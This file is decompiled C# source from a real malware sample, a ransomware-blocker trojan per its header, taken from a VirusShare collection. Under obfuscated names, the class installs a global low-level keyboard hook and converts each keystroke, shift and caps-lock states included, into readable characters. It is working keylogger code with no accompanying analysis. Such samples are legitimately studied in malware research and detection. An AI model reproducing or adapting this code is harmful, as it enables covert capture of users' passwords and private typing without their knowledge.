// Decompiled with JetBrains decompiler
// Type: UhvctgkKxvpIFbx
// Assembly: server, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 43D2DA6E-E5A8-48CD-9FFE-4B8E608D710F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-1d3c236e913c9bcc699c04be99e89b46d1529c91e20a675869c16f7b9bf84280.exe

using Microsoft.VisualBasic.CompilerServices;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class UhvctgkKxvpIFbx
{
  private const int HC_ACTION = 0;
  private const int WH_KEYBOARD_LL = 13;
  private const int WM_KEYDOWN = 256;
  private const int WM_KEYUP = 257;
  private const int WM_SYSKEYDOWN = 260;
  private const int WM_SYSKEYUP = 261;
  private static int KeyHook;
  private static UhvctgkKxvpIFbx.KeyboardProcDelegate KeyHookDelegate;

  [DllImport("user32", EntryPoint = "SetWindowsHookExA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int SetWindowsHookEx(
    int idHook,
    UhvctgkKxvpIFbx.KeyboardProcDelegate lpfn,
    int hmod,
    int dwThreadId);

  [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int CallNextHookEx(
    int hHook,
    int nCode,
    int wParam,
    UhvctgkKxvpIFbx.KBDLLHOOKSTRUCT lParam);

  [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int UnhookWindowsHookEx(int hHook);

  public static event UhvctgkKxvpIFbx.KeyDownEventHandler KeyDown;

  public static event UhvctgkKxvpIFbx.KeyUpEventHandler KeyUp;

  public static event UhvctgkKxvpIFbx.CtrlAltDeleteEventHandler CtrlAltDelete;

  public void WcYjmCXYirmQfyT()
  {
    UhvctgkKxvpIFbx.KeyHookDelegate = new UhvctgkKxvpIFbx.KeyboardProcDelegate(this.KeyboardProc);
    UhvctgkKxvpIFbx.KeyHook = UhvctgkKxvpIFbx.SetWindowsHookEx(13, UhvctgkKxvpIFbx.KeyHookDelegate, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
  }

  private int KeyboardProc(int nCode, int wParam, ref UhvctgkKxvpIFbx.KBDLLHOOKSTRUCT lParam)
  {
    if (nCode == 0)
    {
      switch (wParam)
      {
        case 256:
        case 260:
          UhvctgkKxvpIFbx.KeyDownEventHandler keyDownEvent = UhvctgkKxvpIFbx.KeyDownEvent;
          if (keyDownEvent != null)
          {
            keyDownEvent((Keys) lParam.vkCode);
            break;
          }
          break;
        case 257:
        case 261:
          UhvctgkKxvpIFbx.KeyUpEventHandler keyUpEvent = UhvctgkKxvpIFbx.KeyUpEvent;
          if (keyUpEvent != null)
          {
            keyUpEvent((Keys) lParam.vkCode);
            break;
          }
          break;
      }
    }
    return UhvctgkKxvpIFbx.CallNextHookEx(UhvctgkKxvpIFbx.KeyHook, nCode, wParam, lParam);
  }

  public void Unhook()
  {
    UhvctgkKxvpIFbx.UnhookWindowsHookEx(UhvctgkKxvpIFbx.KeyHook);
    // ISSUE: explicit finalizer call
    this.Finalize();
  }

  public string lgVCKLJOyszdqpG(Keys eCode)
  {
    Keys keys = eCode;
    if (keys >= Keys.A && keys <= Keys.Z)
    {
      if (Control.IsKeyLocked(Keys.Capital))
        return eCode.ToString();
      return (Control.ModifierKeys & Keys.Shift) != Keys.None ? eCode.ToString() : eCode.ToString().ToLower();
    }
    if (keys >= Keys.D0 && keys <= Keys.D9)
    {
      if ((Control.ModifierKeys & Keys.Shift) == Keys.None)
        return eCode.ToString().Replace("D", "");
      string Left = eCode.ToString();
      if (Operators.CompareString(Left, "D1", false) == 0)
        return "!";
      if (Operators.CompareString(Left, "D2", false) == 0)
        return "@";
      if (Operators.CompareString(Left, "D3", false) == 0)
        return "#";
      if (Operators.CompareString(Left, "D4", false) == 0)
        return "$";
      if (Operators.CompareString(Left, "D5", false) == 0)
        return "%";
      if (Operators.CompareString(Left, "D6", false) == 0)
        return "^";
      if (Operators.CompareString(Left, "D7", false) == 0)
        return "&";
      if (Operators.CompareString(Left, "D8", false) == 0)
        return "*";
      if (Operators.CompareString(Left, "D9", false) == 0)
        return "(";
      if (Operators.CompareString(Left, "D0", false) == 0)
        return ")";
    }
    else
    {
      if (keys >= Keys.NumPad0 && keys <= Keys.NumPad9)
        return eCode.ToString().Replace("NumPad", "");
      if (keys >= Keys.Multiply && keys <= Keys.Divide)
      {
        string Left = eCode.ToString();
        if (Operators.CompareString(Left, "Divide", false) == 0)
          return "/";
        if (Operators.CompareString(Left, "Multiply", false) == 0)
          return "*";
        if (Operators.CompareString(Left, "Subtract", false) == 0)
          return "-";
        if (Operators.CompareString(Left, "Add", false) == 0)
          return "+";
        if (Operators.CompareString(Left, "Decimal", false) == 0)
          return ".";
      }
      else
      {
        if (keys == Keys.Space)
          return " ";
        if (keys >= Keys.OemSemicolon && keys <= Keys.OemQuotes)
        {
          if ((Control.ModifierKeys & Keys.Shift) != Keys.None)
          {
            string Left = eCode.ToString();
            if (Operators.CompareString(Left, "OemMinus", false) == 0)
              return "_";
            if (Operators.CompareString(Left, "Oemplus", false) == 0)
              return "+";
            if (Operators.CompareString(Left, "OemOpenBrackets", false) == 0)
              return "{";
            if (Operators.CompareString(Left, "Oem6", false) == 0)
              return "}";
            if (Operators.CompareString(Left, "Oem5", false) == 0)
              return "|";
            if (Operators.CompareString(Left, "Oem1", false) == 0)
              return ":";
            if (Operators.CompareString(Left, "Oem7", false) == 0)
              return "\"";
            if (Operators.CompareString(Left, "Oemcomma", false) == 0)
              return "<";
            if (Operators.CompareString(Left, "OemPeriod", false) == 0)
              return ">";
            if (Operators.CompareString(Left, "OemQuestion", false) == 0)
              return "?";
            if (Operators.CompareString(Left, "Oemtilde", false) == 0)
              return "~";
          }
          else
          {
            string Left = eCode.ToString();
            if (Operators.CompareString(Left, "OemMinus", false) == 0)
              return "-";
            if (Operators.CompareString(Left, "Oemplus", false) == 0)
              return "=";
            if (Operators.CompareString(Left, "OemOpenBrackets", false) == 0)
              return "[";
            if (Operators.CompareString(Left, "Oem6", false) == 0)
              return "]";
            if (Operators.CompareString(Left, "Oem5", false) == 0)
              return "\\";
            if (Operators.CompareString(Left, "Oem1", false) == 0)
              return ";";
            if (Operators.CompareString(Left, "Oem7", false) == 0)
              return "'";
            if (Operators.CompareString(Left, "Oemcomma", false) == 0)
              return ",";
            if (Operators.CompareString(Left, "OemPeriod", false) == 0)
              return ".";
            if (Operators.CompareString(Left, "OemQuestion", false) == 0)
              return "/";
            if (Operators.CompareString(Left, "Oemtilde", false) == 0)
              return "`";
          }
        }
        else
          return keys == Keys.Return ? "\r\n" : "<" + eCode.ToString() + ">";
      }
    }
    return (string) null;
  }

  private struct KBDLLHOOKSTRUCT
  {
    public int vkCode;
    public int scancode;
    public int flags;
    public int time;
    public int dwExtraInfo;
  }

  private delegate int KeyboardProcDelegate(
    int nCode,
    int wParam,
    ref UhvctgkKxvpIFbx.KBDLLHOOKSTRUCT lParam);

  public delegate void KeyDownEventHandler(Keys Key);

  public delegate void KeyUpEventHandler(Keys Key);

  public delegate void CtrlAltDeleteEventHandler();
}
